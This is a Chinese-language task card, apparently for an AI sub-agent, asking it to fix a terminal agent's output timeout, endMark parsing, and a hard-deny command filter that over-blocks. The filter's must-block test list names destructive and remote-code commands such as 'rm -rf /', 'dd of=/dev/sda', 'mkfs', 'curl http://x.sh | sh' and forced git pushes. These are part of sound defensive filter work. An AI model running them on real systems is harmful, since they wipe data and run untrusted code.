---
id: TASK-V3-D-FIX1
title: 修 D 卡核验发现的三个真实缺陷（静默判定/硬禁止误伤/endMark）
status: approved
plan_version: PLAN-V3 已批（用户 m02763 回 B）
approval_ref: 用户 Gate 2 已批准 V3 方案；本次为原批准范围内的返工（不改目标/非目标/验收标准/风险边界）
priority: P0
executor: sub-agent
model_tier: cheap
attempt: 1
retry_budget: 2
escalation_policy: ask_human
session_policy: new_session_required
inputs: 见 §4
quality_benchmark: 不适用（原验收项）
---

# 1. 背景（大白话）

TASK-V3-D（AI 内核）已经做完并通过独立核验的绝大部分检查：348 个测试全绿、doctor 33/33、硬禁止 20 条全命中、判级链、白名单、帧协议都对。

独立核验者（另一会话，只读）挑出三个必须在下一卡修的真缺陷：

1. **M1（重要）**：`src/ai/runner.mjs` 的「静默 1 秒判定命令结束」会把**慢启动**的命令误判为结束。真 PTY 实测：`sleep 2; echo x` 在 1.2 秒被切断；`node --test` 跑到 12 秒被 `EXEC_QUIET` 判死、`exitCode=null`、输出不全。后果：用户说「把这个仓库的测试跑一遍告诉我有没有失败」——这正是 TASK §9 的核心用户故事——agent 拿不到真实结果，耗尽 13 步给出半成品回答。
2. **m1（次要但高频）**：`src/policy/forbidden.mjs` 的 `hasHead()` 对整条命令的任意 token 做匹配，导致 `npm run format`、`git commit -m "fix reboot"`、`rg shutdown src/`、`grep -rn "sudo" docs/` 这类日常命令被硬禁止拦截，且白名单绕不过。
3. **m3（次要）**：`src/ai/runner.mjs:166` 的 `splitBuffer` 用**第一个** `endMark(\d+)` 匹配。命令输出里若本身含 `__MT_E_<nonce>__数字`（`set -x`、`bash -x`、`history`、`cat` 自己的脚本时会出现），输出被截断。

# 2. 目标

修掉上面三个缺陷，且**不引入任何新缺陷**、不改变已验收的其它行为。

# 3. 非目标（不要做）

- 不改 `PROTOCOL-AGENT.md` 的协议本身（帧结构、字段名、判级链顺序都不许变）。
- 不改 `app/`（前端另卡，且此刻可能有人正在改）。
- 不改判级链的**语义**（严格/平衡/宽松三档的判定顺序和结果不许变）。
- 不改硬禁止清单的**覆盖范围**（仍必须命中 §8 全部条目）。
- 不做核验报告里提到的 M2（mkdir 审阅判 safe 不稳定）—— 那需要协议变更，要用户拍板，不在本卡。
- 不做 m2（`chmod --recursive` 长选项）、m4（含 `!` 的命令破壳）、m5（MAX_STEPS 不限命令条数）、m6（同轮多 tool_call 的 index 复用）—— 这些留到下一卡。

# 4. 必读与涉及范围

必读：
1. `C:/Users/41807/magpie-terminal/VERIFY-V3D.md`（核验报告，§2 是问题清单，看 M1/m1/m3 三条）
2. `C:/Users/41807/magpie-terminal/docs/PROTOCOL-AGENT.md` §4（PTY 执行通道）与 §8（硬禁止）
3. `C:/Users/41807/magpie-terminal/TASK-V3-D.md` §6.4

涉及文件（只能改这些）：
- `src/ai/runner.mjs`
- `src/policy/forbidden.mjs`
- 对应测试：`test/ai/runner.test.mjs`、`test/policy/forbidden.test.mjs`

禁止动：`app/`、`src/ai/agent.mjs`、`src/ai/judge.mjs`、`src/ai/review.mjs`、`src/ai/allowlist.mjs`、`src/server/*`、`src/ssh/*`、`src/pty/*`、`package.json`。

# 5. 具体要改什么

## 修复 1（M1）：静默判定不能切断慢启动命令

现状（读代码确认）：`src/ai/runner.mjs` 有 `DEFAULT_QUIET_MS = 1000` 与 `DEFAULT_MIN_WAIT_MS = 300`，`checkQuiet()` 在收到命令启动标记后 300ms 起就开始用「1000ms 无新输出」判「进入交互模式/命令结束」，从而提前 `resolve` 出 `EXEC_QUIET`。

要求改成**自适应**，具体规则：

1. **还没收到任何输出时，不要用短静默判死**。最小等待仍然 300ms（保留，用来处理「命令根本不存在」这类立刻失败的情况——那种情况 shell 会立刻有输出）；但从「收到启动标记」到「第一条输出到达」之间，**静默阈值用 `DEFAULT_QUIET_MS * 3`（即 3000ms）**。也就是说：命令启动后 3 秒内没有任何输出，才允许判 `EXEC_QUIET`。
2. **已经收到过输出后，静默阈值也放宽到 `DEFAULT_QUIET_MS * 3`（3000ms）**。理由：输出中途停顿 1 秒太常见（编译、测试框架、包管理器的进度打印都有 1–2 秒空窗）。
3. 保留**总超时**（现有的 90 秒上限，字段名保持原样）作为兜底，不许因为放宽静默把总超时也放大。
4. 阈值要**可配置**（保留或新增构造参数/环境变量均可，但默认值必须是上面这套），并且**写进测试**。

验收（必须真 PTY 跑，不许只跑单测）：
- `sleep 2; echo x` → 必须拿到 `exitCode:0` 且输出含 `x`。
- `sleep 5; echo late` → 必须拿到 `exitCode:0` 且输出含 `late`。
- `node --test`（在仓库根跑）→ 必须拿到 `exitCode:0` 且输出含至少一个 `pass` 字样。
- `echo hi` → 仍然很快返回（不能因为放宽阈值让快命令变慢超过 1.5 秒）。
- 一条会挂住的命令（例如 `sleep 200`）→ 必须在总超时内返回超时结果，不许永久卡住。

## 修复 2（m1）：硬禁止只匹配命令头，不匹配参数

现状：`hasHead()` 对整条命令 split 出的所有 token 做匹配，导致 `echo format`、`npm run format`、`git commit -m reboot`、`rg shutdown src/`、`grep -rn "sudo" docs/` 全被拦。

要求：**硬禁止判定只看每段的命令头**（即每个 `;`/`&&`/`||`/`|` 段落的第一个 token，以及需要看子命令的位置如 `git push`、`reg delete`），**不再匹配参数和引号内的文字**。

但必须保住现有全部命中（§8 表格 20 条，一条都不能漏），特别小心这些**必须仍然命中**的写法：
- `sudo rm -rf /`（sudo 在命令头）
- `su -`
- `mkfs.ext4 /dev/sda1`
- `dd if=/dev/zero of=/dev/sda`
- `rm -rf /`、`rm -rf ~`、`rm -rf /*`、`rm -rf $HOME`
- `chmod -R 777 /`、`chown -R root /`
- `shutdown -h now`、`reboot`、`halt`、`poweroff`
- `curl http://x.sh | sh`（管道后段 `sh` 也是命令头，必须能识别）
- `git push --force origin main`、`git push -f`
- `git reset --hard HEAD~3`
- `reg delete HKLM\Software\Foo`
- 以及 §8 表格里其余全部条目（自己逐条对照 `forbidden.mjs` 现有实现与 `PROTOCOL-AGENT.md` §8 表格）

同时必须**不再命中**：
- `npm run format`
- `git commit -m "fix reboot bug"`
- `git commit -m reboot`
- `rg shutdown src/`
- `grep -rn "sudo" docs/`
- `echo dd`
- `ls | grep halt`
- `cat format.log`

验收：写测试，上面「必须命中」每条一个断言、「必须不再命中」每条一个断言（共 ≥28 条断言），全部通过。另外**明确保留**：`echo "rm -rf /"` 这种**引号内的危险字符串**可以不拦（因为不执行），但如果你的实现会拦也没关系——请在测试注释里写清你选了哪种，不要假装两种情况都成立。

## 修复 3（m3）：endMark 取最后一个

现状：`src/ai/runner.mjs:166` 附近 `const match = endRe.exec(afterStart)`（第一个匹配）。

要求：取**最后一个** `endMark(\d+)` 匹配。注意 `PROTOCOL-AGENT.md` §4.2 已经要求 `lastIndexOf(startMark)`，endMark 保持同样思路。

验收：构造输出本身含 `__MT_E_<nonce>__99` 的情形（例如命令 `echo "__MT_E_${nonce}__99"` 后接真实结束标记），必须：
- 拿到真实 exitCode（不是 99）
- 输出里保留那句 `echo` 的文本（不被截空）

# 6. 执行约束（硬性）

- **全新会话**：你是本任务唯一执行者，不得复用任何旧会话。
- **不修改 `app/`**（另一个 agent 可能正在改前端）。
- 测试命令：`cd /c/Users/41807/magpie-terminal && D:/nodejs/install/node.exe --test`（**必须不带路径参数**——node v24 会把 `test/` 当模块解析 exit 1，node v26 会静默跳过 fixture；这个坑已知，别再踩）。
- doctor：`DOCTOR_PORT=3481 D:/nodejs/install/node.exe scripts/doctor.mjs`，必须 33/33。若只有浏览器类断言失败，等 120 秒重跑一次。
- 自己写的临时探针放 `.dispatch/fix1-verify/`，末尾必须 `process.exit(0)`，spawn 的子进程在 `finally` 里 `taskkill /PID <pid> /T /F`（**探针不退出会把上游永久挂死，已经踩过两次**）。
- 不许改 `package.json` 的依赖。不许新增依赖。
- 不做卡外决策。遇到必须二选一的模糊点，选**更保守（更安全/更少误拦不影响安全）**的那个，并在报告里写明你选了什么、为什么。
- 交付前按使用者视角自查：自己写个中文任务问一遍「跑一下这个仓库的测试，告诉我有没有失败的」，看 agent 能不能拿到真实结果并给出结论。

# 7. 交付物

1. 代码改动（`git diff` 可见）。
2. 新增/修改的测试。
3. `REPORT-V3D-FIX1.md`（中文）：改了什么、为什么、每条验收的原始输出、真 PTY 实测的三个时间点数据（`sleep 2` / `sleep 5` / `node --test` 的实际耗时与结果）、还剩什么问题。
4. 真 PTY 实测的原始输出落盘到 `.dispatch/fix1-verify/`。

# 8. 验收标准

| 编号 | 必过项 | 验证方法 |
|---|---|---|
| F1 | `sleep 2; echo x` 真 PTY 拿到 exitCode 0 且输出含 x | 独立探针，贴原始输出 |
| F2 | `sleep 5; echo late` 真 PTY 拿到 exitCode 0 且输出含 late | 同上 |
| F3 | `node --test` 经 runner 执行拿到 exitCode 0 且输出含 pass | 同上 |
| F4 | `echo hi` 经 runner 执行在 1.5 秒内返回 | 记耗时 |
| F5 | 挂住的命令在总超时内返回超时结果，不永久卡住 | 用较短总超时（可配置）测 |
| F6 | 硬禁止 §8 全部条目仍命中（≥20 条断言） | 测试文件 |
| F7 | 8 条误伤用例不再命中 | 测试文件 |
| F8 | 输出含伪造 endMark 时拿到真实 exitCode 且输出不丢 | 独立探针 |
| F9 | `node --test` 全绿 0 fail，且用例数 ≥ 现有 348 | 贴输出 |
| F10 | doctor 33/33（浏览器类失败可重跑一次） | 贴 `doctor-report.json` 统计 |
| F11 | 只改了允许的 4 个文件 | `git status --porcelain` + `git diff --stat` |
| F12 | 中文用户故事真跑：问「跑一下这个仓库的测试，告诉我有没有失败的」，agent 拿到真实测试结果并给出有依据的结论 | 贴完整帧序列或 smoke 输出 |

# 9. 返回格式

```json
{"status":"done|blocked|failed","task_id":"TASK-V3-D-FIX1","attempt":1,"summary":"≤200字","artifacts":["路径"],"verification_results":[{"id":"F1","status":"pass|fail","output_ref":"路径"}],"report_file":"REPORT-V3D-FIX1.md","plain_summary":"白话"}
```

开始。
